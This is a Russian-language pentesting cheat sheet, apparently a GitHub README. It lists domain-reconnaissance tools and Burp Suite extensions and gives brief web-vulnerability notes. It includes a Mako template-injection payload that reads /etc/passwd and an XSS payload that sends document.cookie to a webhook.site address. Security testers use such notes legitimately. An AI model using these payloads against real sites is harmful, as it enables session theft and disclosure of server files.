# Hack Tips

## Разведка доменных имен

### [Cero](https://github.com/glebarez/cero)
Cero подключается к удалённым хостам и считывает доменные имена из сертификатов, предоставленных во время TLS-рукопожатия. 
- Извлекает сертификаты из любого протокола, работающего через TLS (не только HTTPS).
- Позволяет указывать цели: доменные имена, IP-адреса и диапазоны CIDR (поддержка IPv6).

---

### [hakip2host](https://github.com/hakluke/hakip2host)
Инструмент для возврата связанных доменных имен по списку IP-адресов.
- DNS PTR-поиски
- Альтернативные имена субъектов (SAN) в SSL-сертификатах
- Общие имена (CN) в SSL-сертификатах

---

### [httpx](https://github.com/projectdiscovery/httpx)
Быстрый и многоцелевой HTTP-инструментарий.
- Позволяет запускать несколько тестов с помощью библиотеки.

---

### [waymore](https://github.com/xnl-h4ck3r/waymore)
Инструмент для поиска архивных ссылок через Wayback Machine.
- Находит больше ссылок, чем другие инструменты.
- Загружает архивные ответы и URL-адреса.

---

### [xnLinkFinder](https://github.com/xnl-h4ck3r/xnLinkFinder)
Поиск конечных точек и потенциальных параметров заданной цели.
- Сканирование одного или нескольких доменов/URL
- Поиск файлов и параметров в каталогах или файлах
- Импорт из Burp (XML), ZAP (ASCII), Caido (CSV)
- Интеграция с результатами waymore

---

## Burp Suite — полезные расширения

### Turbo Intruder
Мощное расширение для проведения высокоскоростных атак (brute-force, fuzzing) с помощью скриптов на Python.
- Кастомизация логики атаки
- Обработка ответов для поиска уязвимостей

### Copy as FFUF Command
Упрощает экспорт запросов из Burp Suite для ffuf.
- Автоматически формирует команду ffuf по выбранному запросу

### Hackvertor
Расширение для преобразования и кодирования данных в Burp Suite.
- Большое количество кодировок
- Удобно для генерации payload'ов, обхода фильтров и анализа данных

### Param Miner
Автоматически ищет скрытые и нестандартные параметры в веб-приложениях.
- Позволяет находить дополнительные точки атаки

---

## Веб-уязвимости

### SSTI (Server-Side Template Injection) в Python

#### Mako Templates
- Проверка уязвимости:  
  ```python
  ${7*7}  # → 49
  ```
- Чтение файла:  
  ```python
  <% import os %>${os.popen('cat /etc/passwd').read()}
  ```

---

### XSS Payload

```html
<img src=x onerror="this.src='https://webhook.site/b8ce3f5c-707d-406f-a8df-0dd7928bca42?c='+document.cookie;">
```

---

## LFI (Local File Inclusion)

- **Top 25 LFI Parameters** — [файл](https://github.com/felixsta/hack_tips/blob/main/Top_25_LFI_Parameters)
- **LFI Wordlists:**
  - [SecLists/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)
  - [DragonJAR/Security-Wordlist/main/LFI-WordList-Linux](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux)

---

## SQLi (SQL Injection)
- [Stacked Queries](https://www.sqlinjection.net/stacked-queries/)
- [Pentestmonkey SQLi Cheat Sheet](https://pentestmonkey.net/category/cheat-sheet/sql-injection)